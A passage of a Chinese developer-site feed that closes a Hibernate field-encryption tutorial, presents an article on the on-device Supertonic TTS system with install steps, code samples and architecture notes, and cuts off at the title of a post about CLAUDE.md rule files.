    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Type(type = "encryptedString")</span>
    <span class="hljs-keyword">private</span> String sensitiveData;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-8">5. 编写数据加密和解密流程</h3>
<p>编写代码来创建和读取加密数据。</p>
<h4 data-id="heading-9"><code>Main.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Configure Hibernate</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> config.buildSessionFactory();

        <span class="hljs-comment">// Save encrypted data</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setSensitiveData(<span class="hljs-string">"MySecretData"</span>);
        session.save(user);
        transaction.commit();
        session.close();

        <span class="hljs-comment">// Read encrypted data</span>
        session = sessionFactory.openSession();
        <span class="hljs-type">User</span> <span class="hljs-variable">retrievedUser</span> <span class="hljs-operator">=</span> session.get(User.class, user.getId());
        System.out.println(<span class="hljs-string">"Decrypted data: "</span> + retrievedUser.getSensitiveData());
        session.close();

        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-10">6. 运行数据加密和解密流程</h3>
<p>编译并运行上面的Java代码，它将加密敏感数据保存到数据库，并将加密数据读取并解密后输出。</p>
<h3 data-id="heading-11">例子解释</h3>
<ol>
<li><strong>Hibernate配置：</strong> 配置一个Hibernate配置文件，用于连接数据库。</li>
<li><strong>加密和解密工具类：</strong> 实现一个简单的加密和解密工具类，使用AES加密算法。</li>
<li><strong>自定义Hibernate类型：</strong> 创建一个自定义的Hibernate用户类型，用于处理加密字段的映射。</li>
<li><strong>实体类：</strong> 创建实体类并使用自定义的类型来对字段进行加密。</li>
<li><strong>数据加密和解密流程：</strong> 编写代码来创建和读取加密数据。</li>
</ol>
<p>通过以上配置和代码示例，我们展示了如何在数据加密过程中使用Hibernate。这个示例包括如何配置Hibernate、如何定义加密和解密工具类、如何创建自定义Hibernate类型以及如何编写数据加密和解密流程，帮助你实现数据的加密存储和读取。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一天一个开源项目（第11篇）：Supertonic - 极速设备端多语言TTS，让语音合成在本地飞起来]]></title>    <link>https://juejin.cn/post/7602420156397371435</link>    <guid>https://juejin.cn/post/7602420156397371435</guid>    <pubDate>2026-02-03T12:25:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397371435" data-draft-id="7602454700503613481" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一天一个开源项目（第11篇）：Supertonic - 极速设备端多语言TTS，让语音合成在本地飞起来"/> <meta itemprop="keywords" content="人工智能,开源"/> <meta itemprop="datePublished" content="2026-02-03T12:25:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一天一个开源项目（第11篇）：Supertonic - 极速设备端多语言TTS，让语音合成在本地飞起来
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:25:07.000Z" title="Tue Feb 03 2026 12:25:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>"如果语音合成能在你的设备上以每秒1000+字符的速度运行，完全离线，支持50+语言，那该多好？"</p>
</blockquote>
<p>这是"一天一个开源项目"系列的第11篇文章。今天带你了解的项目是 <strong>Supertonic</strong>（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsupertone-inc%2Fsupertonic" target="_blank" title="https://github.com/supertone-inc/supertonic" ref="nofollow noopener noreferrer">GitHub</a>）。</p>
<p>传统的TTS系统要么依赖云端API（有延迟和隐私问题），要么速度慢、质量差。Supertonic通过ONNX运行时实现了极速、高质量、完全设备端的语音合成，在M1 Mac上达到1000+字符/秒的速度，支持50+语言，内置智能文本规范化，无需预处理，让语音合成真正"飞起来"。</p>
<h3 data-id="heading-1">你将学到什么</h3>
<ul>
<li>Supertonic的核心架构和技术特点</li>
<li>如何在各种平台上使用Supertonic进行TTS</li>
<li>ONNX运行时的优势和实现</li>
<li>内置文本规范化的智能处理</li>
<li>流式处理和实时语音合成</li>
<li>与其他TTS系统的对比分析</li>
<li>如何开始使用Supertonic构建应用</li>
</ul>
<h3 data-id="heading-2">前置知识</h3>
<ul>
<li>对TTS（文本转语音）有基本了解</li>
<li>熟悉至少一种编程语言（Python、JavaScript、Swift、Java等）</li>
<li>了解ONNX的基本概念（可选）</li>
<li>对设备端AI有基本认识（可选）</li>
</ul>
<hr/>
<h2 data-id="heading-3">项目背景</h2>
<h3 data-id="heading-4">项目简介</h3>
<p><strong>Supertonic</strong> 是一个<strong>极速、设备端、多语言的文本转语音（TTS）系统</strong>，专为极致性能和最小计算开销而设计。通过ONNX Runtime运行，完全在设备上运行——无需云端、无需API调用、无需隐私担忧。</p>
<p><strong>项目解决的核心问题</strong>：</p>
<ul>
<li>云端TTS有延迟和隐私问题</li>
<li>传统设备端TTS速度慢、质量差</li>
<li>缺乏多语言支持</li>
<li>文本规范化需要预处理</li>
<li>不同平台需要不同的实现</li>
</ul>
<p><strong>面向的用户群体</strong>：</p>
<ul>
<li>需要设备端TTS的移动应用开发者</li>
<li>需要离线语音合成的桌面应用开发者</li>
<li>对隐私有要求的开发者</li>
<li>需要多语言TTS的国际化应用开发者</li>
<li>对性能有极致要求的开发者</li>
</ul>
<h3 data-id="heading-5">作者/团队介绍</h3>
<p><strong>团队：Supertone Inc.</strong></p>
<ul>
<li><strong>背景</strong>：专注于语音技术和AI的科技公司</li>
<li><strong>贡献者</strong>：4位贡献者，包括核心开发团队</li>
<li><strong>理念</strong>：打造极速、高质量、完全设备端的TTS系统</li>
</ul>
<p><strong>项目创建时间</strong>：2024年（从GitHub活动来看是持续活跃的项目）</p>
<h3 data-id="heading-6">项目数据</h3>
<ul>
<li>⭐ <strong>GitHub Stars</strong>: 2.6k+（持续快速增长）</li>
<li>🍴 <strong>Forks</strong>: 232+</li>
<li>📦 <strong>版本</strong>: v2.0.0（最新版本，2026年1月6日发布）</li>
<li>📄 <strong>License</strong>: MIT（代码），OpenRAIL-M（模型）</li>
<li>🌐 <strong>Demo</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fspaces%2FSupertone%2Fsupertonic-2" target="_blank" title="https://huggingface.co/spaces/Supertone/supertonic-2" ref="nofollow noopener noreferrer">Hugging Face Spaces</a></li>
<li>📚 <strong>文档</strong>: GitHub README包含完整使用指南</li>
<li>💬 <strong>社区</strong>: GitHub Issues活跃</li>
</ul>
<p><strong>项目发展历程</strong>：</p>
<ul>
<li>2024年：项目创建，发布v1版本</li>
<li>2024-2025年：持续优化，添加多语言支持</li>
<li>2025年：发布v2版本，性能大幅提升</li>
<li>2026年：持续迭代，社区活跃度持续提升</li>
</ul>
<hr/>
<h2 data-id="heading-7">主要功能</h2>
<h3 data-id="heading-8">核心作用</h3>
<p>Supertonic的核心作用是<strong>提供极速、高质量、完全设备端的TTS系统</strong>，主要功能包括：</p>
<ol>
<li><strong>极速语音合成</strong>：M1 Mac上达到1000+字符/秒的速度</li>
<li><strong>多语言支持</strong>：支持50+语言，包括英语、中文、日语、韩语等</li>
<li><strong>智能文本规范化</strong>：内置文本规范化，无需预处理</li>
<li><strong>流式处理</strong>：支持流式TTS，实现实时语音合成</li>
<li><strong>完全离线</strong>：无需云端，完全在设备上运行</li>
</ol>
<h3 data-id="heading-9">使用场景</h3>
<ol>
<li>
<p><strong>移动应用</strong></p>
<ul>
<li>阅读助手应用</li>
<li>语音导航应用</li>
<li>无障碍应用</li>
</ul>
</li>
<li>
<p><strong>桌面应用</strong></p>
<ul>
<li>电子书阅读器</li>
<li>文档朗读工具</li>
<li>语音助手</li>
</ul>
</li>
<li>
<p><strong>Web应用</strong></p>
<ul>
<li>浏览器扩展</li>
<li>在线语音合成服务</li>
<li>语音聊天应用</li>
</ul>
</li>
<li>
<p><strong>IoT设备</strong></p>
<ul>
<li>智能音箱</li>
<li>语音交互设备</li>
<li>边缘计算设备</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">快速开始</h3>
<h4 data-id="heading-11">安装方式</h4>
<p>Supertonic支持多种编程语言和平台：</p>
<p><strong>Python</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装Python包</span>
pip install supertonic

<span class="hljs-comment"># 使用示例</span>
from supertonic import SupertonicTTS

tts = SupertonicTTS()
audio = tts.synthesize(<span class="hljs-string">"Hello, world!"</span>)
</code></pre>
<p><strong>JavaScript/Node.js</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装npm包</span>
npm install supertonic

<span class="hljs-comment"># 使用示例</span>
const { SupertonicTTS } = require(<span class="hljs-string">'supertonic'</span>);

const tts = new SupertonicTTS();
const audio = await tts.synthesize(<span class="hljs-string">"Hello, world!"</span>);
</code></pre>
<p><strong>其他平台</strong>：</p>
<ul>
<li><strong>C++</strong>: 使用cpp目录下的实现</li>
<li><strong>Swift</strong>: 使用swift目录下的实现</li>
<li><strong>Java</strong>: 使用java目录下的实现</li>
<li><strong>C#</strong>: 使用csharp目录下的实现</li>
<li><strong>Go</strong>: 使用go目录下的实现</li>
<li><strong>Rust</strong>: 使用rust目录下的实现</li>
<li><strong>Flutter</strong>: 使用flutter目录下的实现</li>
<li><strong>Web</strong>: 使用web目录下的实现</li>
</ul>
<h4 data-id="heading-12">最简单的使用示例</h4>
<p><strong>Python示例</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> supertonic <span class="hljs-keyword">import</span> SupertonicTTS

<span class="hljs-comment"># 初始化TTS引擎</span>
tts = SupertonicTTS()

<span class="hljs-comment"># 合成语音</span>
text = <span class="hljs-string">"Supertonic is a lightning-fast, on-device TTS system."</span>
audio = tts.synthesize(text)

<span class="hljs-comment"># 保存音频文件</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"output.wav"</span>, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
    f.write(audio)
</code></pre>
<p><strong>JavaScript示例</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-title class_">SupertonicTTS</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'supertonic'</span>);

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">synthesize</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> tts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SupertonicTTS</span>();
    <span class="hljs-keyword">const</span> audio = <span class="hljs-keyword">await</span> tts.<span class="hljs-title function_">synthesize</span>(<span class="hljs-string">"Supertonic is lightning-fast!"</span>);
    <span class="hljs-comment">// 处理音频数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Audio generated:"</span>, audio.<span class="hljs-property">length</span>, <span class="hljs-string">"bytes"</span>);
}

<span class="hljs-title function_">synthesize</span>();
</code></pre>
<h3 data-id="heading-13">核心特性</h3>
<ul>
<li><strong>极速性能</strong>：M1 Mac上1000+字符/秒，远超传统TTS系统</li>
<li><strong>多语言支持</strong>：支持50+语言，包括主要国际语言</li>
<li><strong>智能文本规范化</strong>：内置文本规范化，处理数字、日期、缩写等复杂表达</li>
<li><strong>流式处理</strong>：支持流式TTS，实现实时语音合成</li>
<li><strong>完全离线</strong>：无需云端，完全在设备上运行，保护隐私</li>
<li><strong>跨平台支持</strong>：支持C++、Swift、JavaScript、Java、C#、Go、Rust、Flutter、Web等</li>
<li><strong>ONNX运行时</strong>：基于ONNX Runtime，高效推理</li>
<li><strong>高质量语音</strong>：生成自然、清晰的语音</li>
</ul>
<h3 data-id="heading-14">项目优势</h3>





















































<table><thead><tr><th align="left">对比项</th><th align="left">Supertonic</th><th align="left">云端TTS</th><th align="left">传统设备端TTS</th></tr></thead><tbody><tr><td align="left"><strong>速度</strong></td><td align="left">✅ 1000+字符/秒</td><td align="left">⚠️ 受网络影响</td><td align="left">❌ 慢</td></tr><tr><td align="left"><strong>隐私</strong></td><td align="left">✅ 完全本地</td><td align="left">❌ 数据上传</td><td align="left">✅ 本地</td></tr><tr><td align="left"><strong>延迟</strong></td><td align="left">✅ 极低</td><td align="left">❌ 网络延迟</td><td align="left">⚠️ 中等</td></tr><tr><td align="left"><strong>多语言</strong></td><td align="left">✅ 50+语言</td><td align="left">✅ 支持</td><td align="left">⚠️ 有限</td></tr><tr><td align="left"><strong>文本规范化</strong></td><td align="left">✅ 内置智能处理</td><td align="left">⚠️ 需要预处理</td><td align="left">❌ 需要预处理</td></tr><tr><td align="left"><strong>离线使用</strong></td><td align="left">✅ 完全离线</td><td align="left">❌ 需要网络</td><td align="left">✅ 离线</td></tr><tr><td align="left"><strong>成本</strong></td><td align="left">✅ 免费开源</td><td align="left">❌ API费用</td><td align="left">✅ 免费</td></tr></tbody></table>
<p><strong>为什么选择Supertonic？</strong></p>
<p>相比云端TTS和传统设备端TTS，Supertonic提供极速性能、完全离线、智能文本规范化、多语言支持，是设备端TTS的理想选择。</p>
<hr/>
<h2 data-id="heading-15">项目详细剖析</h2>
<h3 data-id="heading-16">架构设计</h3>
<p>Supertonic采用<strong>ONNX Runtime</strong>作为推理引擎，实现高效的设备端TTS。</p>
<h4 data-id="heading-17">核心架构</h4>
<pre><code class="hljs language-vbnet" lang="vbnet">Supertonic TTS System
├── <span class="hljs-keyword">Text</span> Normalization（文本规范化）
│   ├── 数字处理
│   ├── 日期时间处理
│   ├── 缩写展开
│   └── 多语言支持
├── <span class="hljs-keyword">Text</span>-<span class="hljs-keyword">to</span>-Latent（文本到潜在空间）
│   ├── Flow Matching模型
│   ├── Length-Aware RoPE
│   └── 文本-语音对齐
├── Latent-<span class="hljs-keyword">to</span>-Speech（潜在空间到语音）
│   ├── Speech Autoencoder
│   ├── 流式处理
│   └── 音频生成
└── ONNX Runtime（推理引擎）
    ├── 模型优化
    ├── 硬件加速
    └── 跨平台支持
</code></pre>
<h4 data-id="heading-18">ONNX Runtime优势</h4>
<p>ONNX Runtime提供了以下优势：</p>
<ul>
<li><strong>跨平台</strong>：统一的模型格式，支持多种平台</li>
<li><strong>硬件加速</strong>：支持GPU、NPU等硬件加速</li>
<li><strong>模型优化</strong>：自动优化模型推理性能</li>
<li><strong>易于部署</strong>：模型导出后可直接部署</li>
</ul>
<h4 data-id="heading-19">文本规范化</h4>
<p>Supertonic内置智能文本规范化，能够处理：</p>
<ul>
<li><strong>数字</strong>：123 → "one hundred twenty-three"</li>
<li><strong>日期</strong>：2024-01-01 → "January first, twenty twenty-four"</li>
<li><strong>时间</strong>：2:30 → "two thirty"</li>
<li><strong>缩写</strong>：Dr. → "Doctor"</li>
<li><strong>单位</strong>：30kph → "thirty kilometers per hour"</li>
<li><strong>技术缩写</strong>：h → "hours"</li>
</ul>
<p><strong>优势</strong>：</p>
<ul>
<li>无需预处理，直接处理原始文本</li>
<li>智能识别上下文，正确展开缩写</li>
<li>支持多语言，每种语言有专门的规范化规则</li>
</ul>
<h4 data-id="heading-20">流式处理</h4>
<p>Supertonic支持流式TTS，实现实时语音合成：</p>
<p><strong>工作流程</strong>：</p>
<ol>
<li>文本分块处理</li>
<li>逐块生成音频</li>
<li>实时输出音频流</li>
<li>低延迟响应</li>
</ol>
<p><strong>优势</strong>：</p>
<ul>
<li>低延迟，适合实时应用</li>
<li>内存占用小，适合移动设备</li>
<li>用户体验好，响应迅速</li>
</ul>
<h3 data-id="heading-21">多语言支持</h3>
<p>Supertonic支持50+语言，包括：</p>
<p><strong>主要语言</strong>：</p>
<ul>
<li>英语、中文、日语、韩语</li>
<li>西班牙语、法语、德语、意大利语、葡萄牙语</li>
<li>俄语、阿拉伯语、印地语</li>
<li>泰语、越南语、印尼语</li>
</ul>
<p><strong>其他语言</strong>：</p>
<ul>
<li>荷兰语、波兰语、土耳其语、捷克语</li>
<li>罗马尼亚语、匈牙利语、希腊语</li>
<li>芬兰语、瑞典语、挪威语、丹麦语</li>
<li>以及更多语言</li>
</ul>
<p>每种语言都有专门的：</p>
<ul>
<li>文本规范化规则</li>
<li>语音模型</li>
<li>发音字典</li>
</ul>
<h3 data-id="heading-22">性能优化</h3>
<p>Supertonic通过多种技术实现极速性能：</p>
<h4 data-id="heading-23">模型优化</h4>
<ul>
<li><strong>模型压缩</strong>：减小模型大小，提升推理速度</li>
<li><strong>量化</strong>：使用INT8量化，在保持质量的同时提升速度</li>
<li><strong>算子融合</strong>：融合多个算子，减少计算开销</li>
</ul>
<h4 data-id="heading-24">硬件加速</h4>
<ul>
<li><strong>GPU加速</strong>：利用GPU并行计算能力</li>
<li><strong>NPU加速</strong>：支持NPU硬件加速（如Apple Neural Engine）</li>
<li><strong>CPU优化</strong>：针对CPU的SIMD优化</li>
</ul>
<h4 data-id="heading-25">推理优化</h4>
<ul>
<li><strong>批处理</strong>：批量处理多个请求</li>
<li><strong>缓存</strong>：缓存常用文本的音频结果</li>
<li><strong>预加载</strong>：预加载模型到内存</li>
</ul>
<h3 data-id="heading-26">应用案例</h3>
<p>多个项目基于Supertonic构建：</p>
<ol>
<li><strong>TLDRL</strong>：Chrome扩展，免费设备端TTS，可朗读任何网页</li>
<li><strong>Read Aloud</strong>：开源TTS浏览器扩展，支持Chrome和Edge</li>
<li><strong>PageEcho</strong>：iOS电子书阅读器应用</li>
<li><strong>VoiceChat</strong>：浏览器中的设备端语音到语音LLM聊天机器人</li>
<li><strong>OmniAvatar</strong>：从照片和语音生成说话头像视频</li>
<li><strong>CopiloTTS</strong>：Kotlin多平台TTS SDK</li>
<li><strong>Voice Mixer</strong>：PyQt5工具，用于混合和修改语音风格</li>
<li><strong>Supertonic MNN</strong>：基于MNN的轻量级库（fp32/fp16/int8）</li>
<li><strong>Transformers.js</strong>：Hugging Face的JS库，支持Supertonic</li>
<li><strong>Pinokio</strong>：Mac、Windows、Linux的一键本地云</li>
</ol>
<h3 data-id="heading-27">技术论文</h3>
<p>Supertonic基于三篇核心论文：</p>
<ol>
<li>
<p><strong>SupertonicTTS: Main Architecture</strong></p>
<ul>
<li>介绍SupertonicTTS的整体架构</li>
<li>包括语音自编码器、基于Flow Matching的文本到潜在空间模块</li>
<li>高效设计选择</li>
</ul>
</li>
<li>
<p><strong>Length-Aware RoPE: Text-Speech Alignment</strong></p>
<ul>
<li>提出Length-Aware Rotary Position Embedding (LARoPE)</li>
<li>改善交叉注意力机制中的文本-语音对齐</li>
</ul>
</li>
<li>
<p><strong>Self-Purifying Flow Matching: Training with Noisy Labels</strong></p>
<ul>
<li>描述自净化技术</li>
<li>使用噪声或不可靠标签稳健训练Flow Matching模型</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-28">项目地址与资源</h2>
<h3 data-id="heading-29">官方资源</h3>
<ul>
<li>🌟 <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsupertone-inc%2Fsupertonic" target="_blank" title="https://github.com/supertone-inc/supertonic" ref="nofollow noopener noreferrer">github.com/supertone-i…</a></li>
<li>🌐 <strong>Demo</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fspaces%2FSupertone%2Fsupertonic-2" target="_blank" title="https://huggingface.co/spaces/Supertone/supertonic-2" ref="nofollow noopener noreferrer">Hugging Face Spaces</a></li>
</ul>
<h3 data-id="heading-30">适用人群</h3>
<p><strong>Supertonic特别适合</strong>：需要设备端TTS的移动应用开发者、需要离线语音合成的桌面应用开发者、对隐私有要求的开发者、需要多语言TTS的国际化应用开发者、对性能有极致要求的开发者、需要实时语音合成的应用开发者。</p>
<p><strong>不适合</strong>：只需要云端TTS的用户、不需要多语言支持的场景、对模型大小有严格限制的极端场景。</p>
<hr/>
<p><em>欢迎来我中的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>找到更多有用的知识和有趣的产品</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[团队宪法:CLAUDE.md 和rule使用技巧与复利模式]]></title>    <link>https://juejin.cn/post/7602454700503646249</link>    <guid>https://juejin.cn/post/7602454700503646249</guid>    <pubDate>2026-02-03T12:33:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700503646249" data-draft-id="7602503154505089065" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="团队宪法:CLAUDE.md 和rule使用技巧与复利模式"/> <meta itemprop="keywords" content="Claude,AI编程"/> <meta itemprop="datePublished" content="2026-02-03T12:33:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            团队宪法:CLAUDE.md 和rule使用技巧与复利模式
